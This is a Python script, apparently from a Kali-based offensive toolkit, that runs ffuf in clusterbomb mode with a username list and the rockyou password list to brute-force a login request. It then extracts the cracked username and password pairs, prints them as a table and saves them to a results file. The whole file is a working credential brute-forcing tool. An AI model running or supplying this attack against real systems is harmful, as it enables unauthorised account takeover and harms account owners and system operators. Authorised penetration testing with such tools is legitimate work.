import subprocess
import pandas as pd
import os
from rich.console import Console
from rich.table import Table
from io import StringIO

def main():
    # Step 1: Ask for the domain (Not used directly in ffuf command here)
    domain = input("What is the domain? ")

    # Step 2: Ask for the output file name
    output_file_name = input("Enter the output file name (without extension): ")
    output_dir = "/home/kali/Desktop/hackhound/Results/Exploitations_Results/"
    output_file_path = os.path.join(output_dir, f"{output_file_name}.txt")

    # Ensure the output directory exists
    os.makedirs(output_dir, exist_ok=True)

    # Step 3: Run the ffuf command
    ffuf_command = f"ffuf -request request.txt -request-proto http -mode clusterbomb -w top-100.txt:FUZZUSER -w rockyou1.txt:FUZZPASS -fs 14"
    print("Running ffuf command...")
    result = subprocess.run(ffuf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Check if ffuf encountered an error
    if result.returncode != 0:
        print("ffuf command failed with error:")
        print(result.stderr.decode())
        return

    # Step 4: Display result in interface (console in this case)
    ffuf_output = result.stdout.decode()
    print("ffuf output:\n", ffuf_output)

    # Step 5 and 6: Extract User and Pass from the ffuf output
    lines = ffuf_output.splitlines()
    user_pass_list = []
    for line in lines:
        if "FUZZUSER" in line and "FUZZPASS" in line:
            parts = line.split()
            user = parts[parts.index("FUZZUSER") + 1]
            password = parts[parts.index("FUZZPASS") + 1]
            user_pass_list.append((user, password))

    # Step 7: Create a DataFrame with columns User and Pass
    df = pd.DataFrame(user_pass_list, columns=['User', 'Pass'])

    # Step 8: Create the table as a string using Rich
    console = Console()
    table = Table(title="Extracted User and Pass")

    table.add_column("User", style="green")
    table.add_column("Pass", style="green")

    for user, password in user_pass_list:
        table.add_row(user, password)

    # Capture the table output as a string
    with StringIO() as sio:
        console = Console(file=sio)
        console.print(table)
        table_str = sio.getvalue()

    # Save the table to the specified output file
    with open(output_file_path, 'w') as f:
        f.write(table_str)

    print(f"Results saved to {output_file_path}")

    # Step 9: Show the table in the terminal
    console = Console()
    console.print(table)

if __name__ == "__main__":
    main()
